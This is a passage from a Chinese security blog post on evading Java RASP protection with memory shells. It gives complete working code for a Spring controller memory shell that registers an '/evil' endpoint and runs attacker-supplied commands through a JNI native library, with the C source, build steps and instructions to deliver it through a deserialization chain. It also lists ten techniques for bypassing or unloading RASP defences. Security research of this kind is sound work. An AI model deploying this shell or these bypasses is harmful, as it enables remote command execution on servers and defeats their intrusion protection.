+                <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">((</span><span class="n">osTyp</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osTyp</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"win"</span><span class="o">))</span> <span class="o">?</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[]{</span><span class="s">"cmd.exe"</span><span class="o">,</span> <span class="s">"/c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)}:</span><span class="k">new</span> <span class="nc">String</span><span class="o">[]{</span><span class="s">"sh"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">)}).</span><span class="na">getInputStream</span><span class="o">();</span>
+                <span class="nc">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\a"</span><span class="o">);</span>
+                <span class="nc">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>在其基础上新建一个 SpringControllerMemshell 类，进行如下的修改：</p>
+<ol>
+  <li>添加一个 native 方法</li>
+  <li>将原有的 index 方法改为执行 doExec 方法。</li>
+  <li>添加一个成员变量 jniCodes，用于存放 base64 编码后的 so 文件内容。</li>
+  <li>添加一个 getJNILibFile 方法，用于在 /tmp 目录下写入 so 文件，并返回文件路径。</li>
+  <li>在 static 代码块中使用 System.load 加载 so 文件。</li>
+</ol>
+
+<p>文件内容修改如下：</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.ResponseBody</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.ServletRequestAttributes</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.PatternsRequestCondition</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.RequestMappingInfo</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.util.pattern.PathPatternParser</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SpringControllerJNIMemshell</span> <span class="o">{</span>
+
+    <span class="kd">final</span> <span class="kd">static</span> <span class="nc">String</span> <span class="n">jniCodes</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span><span class="n">getJNILibFile</span>
+
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">inject_uri</span> <span class="o">=</span> <span class="s">"/evil"</span><span class="o">;</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="n">getJNILibFile</span><span class="o">(</span><span class="n">jniCodes</span><span class="o">));</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Controller Injecting"</span><span class="o">);</span>
+            <span class="nc">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="nc">WebApplicationContext</span><span class="o">)</span> <span class="nc">RequestContextHolder</span><span class="o">.</span>
+                    <span class="nf">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+            <span class="nc">RequestMappingHandlerMapping</span> <span class="n">mappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="nc">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+
+            <span class="nc">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">mappingHandlerMapping</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"mappingRegistry"</span><span class="o">);</span>
+            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="nc">Object</span> <span class="n">mappingRegistry</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">mappingHandlerMapping</span><span class="o">);</span>
+
+            <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry"</span><span class="o">);</span>
+
+
+            <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">field</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"urlLookup"</span><span class="o">);</span>
+                <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">NoSuchFieldException</span> <span class="n">e</span><span class="o">){</span>
+                <span class="n">field</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"pathLookup"</span><span class="o">);</span>
+                <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">urlLookup</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">mappingRegistry</span><span class="o">);</span>
+            <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">urlPath</span> <span class="o">:</span> <span class="n">urlLookup</span><span class="o">.</span><span class="na">keySet</span><span class="o">())</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">inject_uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">urlPath</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">();</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+
+            <span class="nc">Class</span> <span class="o">&lt;?&gt;</span> <span class="n">evilClass</span> <span class="o">=</span> <span class="nc">SpringControllerJNIMemshell</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
+
+            <span class="nc">Method</span> <span class="n">method2</span> <span class="o">=</span> <span class="n">evilClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"index"</span><span class="o">);</span>
+
+            <span class="nc">RequestMappingInfo</span><span class="o">.</span><span class="na">BuilderConfiguration</span> <span class="n">option</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">RequestMappingInfo</span><span class="o">.</span><span class="na">BuilderConfiguration</span><span class="o">();</span>
+            <span class="n">option</span><span class="o">.</span><span class="na">setPatternParser</span><span class="o">(</span><span class="k">new</span> <span class="nc">PathPatternParser</span><span class="o">());</span>
+
+            <span class="nc">RequestMappingInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="nc">RequestMappingInfo</span><span class="o">.</span><span class="na">paths</span><span class="o">(</span><span class="n">inject_uri</span><span class="o">).</span><span class="na">options</span><span class="o">(</span><span class="n">option</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
+
+            <span class="c1">// 将该controller注册到Spring容器</span>
+            <span class="n">mappingHandlerMapping</span><span class="o">.</span><span class="na">registerMapping</span><span class="o">(</span><span class="n">info</span><span class="o">,</span> <span class="n">evilClass</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(),</span> <span class="n">method2</span><span class="o">);</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Controller Injected"</span><span class="o">);</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">native</span> <span class="nc">String</span> <span class="nf">doExec</span><span class="o">(</span><span class="nc">String</span> <span class="n">cmd</span><span class="o">);</span>
+
+    <span class="cm">/**
+     * 写JNI链接库文件
+     * @param base64 JNI动态库Base64
+     * @return 返回是否写入成功
+     */</span>
+    <span class="kd">public</span>  <span class="kd">static</span>  <span class="nc">String</span> <span class="nf">getJNILibFile</span><span class="o">(</span><span class="nc">String</span> <span class="n">base64</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">base64</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">File</span> <span class="n">jniDir</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"java.io.tmpdir"</span><span class="o">),</span> <span class="s">"jni-lib"</span><span class="o">);</span>
+
+            <span class="k">if</span> <span class="o">(!</span><span class="n">jniDir</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
+                <span class="n">jniDir</span><span class="o">.</span><span class="na">mkdir</span><span class="o">();</span>
+            <span class="o">}</span>
+
+            <span class="nc">String</span> <span class="n">filename</span><span class="o">;</span>
+
+            <span class="n">filename</span> <span class="o">=</span> <span class="s">"slib.so"</span><span class="o">;</span>
+
+            <span class="nc">File</span> <span class="n">jniFile</span> <span class="o">=</span>  <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">jniDir</span><span class="o">,</span> <span class="n">filename</span><span class="o">);</span>
+
+            <span class="k">if</span> <span class="o">(!</span><span class="n">jniFile</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
+                <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">jniCodes</span><span class="o">);</span>
+
+                <span class="k">if</span> <span class="o">(</span><span class="n">bytes</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="nc">FileOutputStream</span> <span class="n">fos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="n">jniFile</span><span class="o">);</span>
+                    <span class="n">fos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
+                    <span class="n">fos</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+                    <span class="n">fos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+            <span class="k">return</span> <span class="n">jniFile</span><span class="o">.</span><span class="na">getAbsolutePath</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="s">""</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">index</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
+        <span class="nc">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="o">((</span><span class="nc">ServletRequestAttributes</span><span class="o">)</span> <span class="o">(</span><span class="nc">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">())).</span><span class="na">getRequest</span><span class="o">();</span>
+        <span class="nc">HttpServletResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="o">((</span><span class="nc">ServletRequestAttributes</span><span class="o">)</span> <span class="o">(</span><span class="nc">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">())).</span><span class="na">getResponse</span><span class="o">();</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">cmd</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">doExec</span><span class="o">(</span><span class="n">cmd</span><span class="o">));</span>
+                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>接着就是常规的步骤：</p>
+<ol>
+  <li>使用 javac 进行编译</li>
+  <li>使用 javah 生成 .h 文件</li>
+  <li>编写 c 代码。示例如下：
+    <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">#include</span><span class="cpf">&lt;jni.h&gt;</span><span class="cp">
+</span> <span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span> <span class="cp">#include</span><span class="cpf">&lt;cstdlib&gt;</span><span class="cp">
+</span> <span class="cp">#include</span><span class="cpf">&lt;cstring&gt;</span><span class="cp">
+</span> <span class="cp">#include</span> <span class="cpf">"xyz_eki_marshalexp_memshell_SpringBoot_Controller_SpringControllerJNIMemshell.h"</span><span class="cp">
+</span>
+ <span class="kt">int</span> <span class="nf">execmd</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">)</span>
+ <span class="p">{</span>
+     <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="o">*</span><span class="mi">12</span><span class="p">];</span>              <span class="c1">//定义缓冲区</span>
+     <span class="kt">FILE</span> <span class="o">*</span><span class="n">pipe</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span> <span class="c1">//打开管道，并执行命令</span>
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe</span><span class="p">)</span>
+         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//返回0表示运行失败</span>
+
+     <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">feof</span><span class="p">(</span><span class="n">pipe</span><span class="p">))</span>
+     <span class="p">{</span>
+         <span class="k">if</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">pipe</span><span class="p">))</span>
+         <span class="p">{</span> <span class="c1">//将管道输出到result中</span>
+             <span class="n">strcat</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+         <span class="p">}</span>
+     <span class="p">}</span>
+     <span class="n">pclose</span><span class="p">(</span><span class="n">pipe</span><span class="p">);</span> <span class="c1">//关闭管道</span>
+     <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>      <span class="c1">//返回1表示运行成功</span>
+ <span class="p">}</span>
+
+
+ <span class="n">JNIEXPORT</span> <span class="n">jstring</span> <span class="n">JNICALL</span> <span class="nf">Java_xyz_eki_marshalexp_memshell_SpringBoot_Controller_SpringControllerJNIMemshell_doExec</span><span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">thisObj</span><span class="p">,</span><span class="n">jstring</span> <span class="n">jstr</span><span class="p">)</span> <span class="p">{</span>
+     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cstr</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">GetStringUTFChars</span><span class="p">(</span><span class="n">jstr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+     <span class="kt">char</span> <span class="n">result</span><span class="p">[</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span> <span class="c1">//定义存放结果的字符串数组</span>
+     <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">==</span> <span class="n">execmd</span><span class="p">(</span><span class="n">cstr</span><span class="p">,</span> <span class="n">result</span><span class="p">))</span>
+     <span class="p">{</span>
+         <span class="c1">// printf(result);</span>
+     <span class="p">}</span>
+
+     <span class="kt">char</span> <span class="n">return_messge</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+     <span class="n">strcat</span><span class="p">(</span><span class="n">return_messge</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
+     <span class="n">jstring</span> <span class="n">cmdresult</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">NewStringUTF</span><span class="p">(</span><span class="n">return_messge</span><span class="p">);</span>
+     <span class="c1">//system();</span>
+
+     <span class="k">return</span> <span class="n">cmdresult</span><span class="p">;</span>
+ <span class="p">}</span>
+
+ <span class="n">JNIEXPORT</span> <span class="n">jint</span> <span class="n">JNICALL</span> <span class="nf">JNI_OnLoad</span><span class="p">(</span><span class="n">JavaVM</span><span class="o">*</span> <span class="n">vm</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">reserved</span><span class="p">){</span>
+     <span class="k">return</span> <span class="n">JNI_VERSION_1_4</span><span class="p">;</span> <span class="c1">//这里很重要，必须返回版本，否则加载会失败。</span>
+ <span class="p">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>编译并获取 base64 编码内容.
+    <div class="language-makefile highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">OBJ</span> <span class="o">=</span> SpringControllerJNIMemshell.cpp
+ <span class="nv">CFLAGS</span> <span class="o">=</span> <span class="nt">-shared</span> <span class="nt">-fPIC</span>
+ <span class="nv">CC</span> <span class="o">=</span> gcc
+ <span class="nv">TARGET</span> <span class="o">=</span> jni.so
+
+ <span class="nl">all</span><span class="o">:</span>
+     <span class="err">$(CC)</span> <span class="err">-I</span><span class="s2">"${JAVA_HOME}/include"</span> <span class="err">-I</span><span class="s2">"${JAVA_HOME}/include/linux"</span> <span class="err">$(OBJ)</span> <span class="err">$(CFLAGS)</span> <span class="err">-o</span> <span class="err">$(TARGET)</span>
+
+ <span class="nl">clean</span><span class="o">:</span>
+     <span class="err">rm</span> <span class="err">*.o</span> <span class="err">*.so</span>
+</code></pre></div>    </div>
+    <p>获取 base64</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">cat </span>jni.so | <span class="nb">base64</span> <span class="nt">-w</span> 0
+</code></pre></div>    </div>
+    <p>获取 base64 编码内容后，将其填充到 jniCodes 中，使用反序列化利用链打入即可。</p>
+  </li>
+</ol>
+
+<h2 id="其他绕过方法">其他绕过方法</h2>
+<p>其他的绕过方法研究可以参考文章：<a href="https://www.cnblogs.com/wh4am1/p/16780056.html">RASP的安全攻防研究实践 - admin-神风 - 博客园</a>，这里仅进行罗列：</p>
+<blockquote>
+  <ol>
+    <li>破坏 RASP 的开关。OpenRASP 中存在一个 hook 开关，反射修改这个 hook 开关可关闭所有拦截。Jrasp 没有明显的开关可以去操控但作者也实现的类似的效果。</li>
+    <li>熔断开关。很多商业化的产品有类似的CPU熔断机制，如果 CPU 达到 90%，就自动关闭 Rasp 的拦截。因此可以通过发送一些大的数据包或者流量，造成 CPU 的压力来触发 RASP 的熔断开关</li>
+    <li>伪装恶意类。很多 RASP 产品是通过堆栈信息回溯的方式来判断命令执行的地方从哪里来，例如检测 behinder 时会判断堆栈是否包含net.rebeyond.behinder类开头的信息。作者给出了伪装类名的方法。</li>
+    <li>新建线程绕过。新建线程可以绕过堆栈检查，但无法绕过黑白名单。</li>
+    <li>Bootstrap ClassLoader 加载绕过内存马检测。某些 RASP 在检测内存马时，通过判断当前类的 ClassLoader 是否存在对应的 .class 文件落地，使用Instrumentation.appendToBootstrapClassLoaderSearch 方法加载的 jar 包是以 Bootstrap ClassLoader 加载的，因此能够绕过检测。</li>
+    <li>通过 Unsafe 方式绕过。Unsafe.allocateInstance方法可以实例化一个对象而不调用它的构造方法，再去执行它的 Native 方法，从而绕过 Rasp 的检测。作者给出的示例中，通过直接执行 forkAndExec 的 Native 方法来执行命令。</li>
+    <li>通过 WindowsVirtualMachine 注入 ShellCode 加载。向自身进程植入并运行 ShellCode 绕过 RASP</li>
+    <li>Java 跨平台任意 Native 代码执行。</li>
+    <li>弱引用 GC. 一种依托 WeakReference 弱引用的命令执行方式，有别于常规的命令执行，因此在某些场景下可以绕过。</li>
+    <li>高权限场景卸载 RASP。通过获取 tools.jar 的路径，调用里面的 JVM API 来卸载 RASP</li>
+  </ol>
+</blockquote>
+
+<h1 id="参考资料">参考资料</h1>
+<ul>
+  <li><a href="https://github.com/ikkisoft/SerialKiller">ikkisoft/SerialKiller: Look-Ahead Java Deserialization Library</a></li>
+  <li><a href="https://www.freebuf.com/sectool/343738.html">从CodeQL的角度分析CTF题解和对应利用链挖掘1 - FreeBuf网络安全行业门户</a></li>
+  <li><a href="https://www.secpulse.com/archives/180773.html">使用CodeQL分析CTF题目 - SecPulse.COM - 安全脉搏</a></li>
+  <li><a href="https://blog.oversec.fun/kryo-deserialize-learn">Kryo反序列化学习</a></li>
+  <li><a href="http://www.bmth666.cn/bmth_blog/2022/11/02/RASP%E7%BB%95%E8%BF%87%E5%88%9D%E6%8E%A2/#JNI%E7%BB%95%E8%BF%87RASP">RASP绕过初探</a></li>
+  <li><a href="https://www.freebuf.com/articles/web/164413.html">百度安全的OpenRASP项目，究竟是什么？ - FreeBuf网络安全行业门户</a></li>
+  <li><a href="https://www.cnblogs.com/wh4am1/p/16780056.html">RASP的安全攻防研究实践 - admin-神风 - 博客园</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-06-15T05:53:40+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-SerialKiller.html">Java 反序列化绕过 SerialKiller</a></div><div class="next"><span>NEXT</span><a href="/python/2023/06/15/Werkzeug-debug-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html">Werkzeug debug 安全问题</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
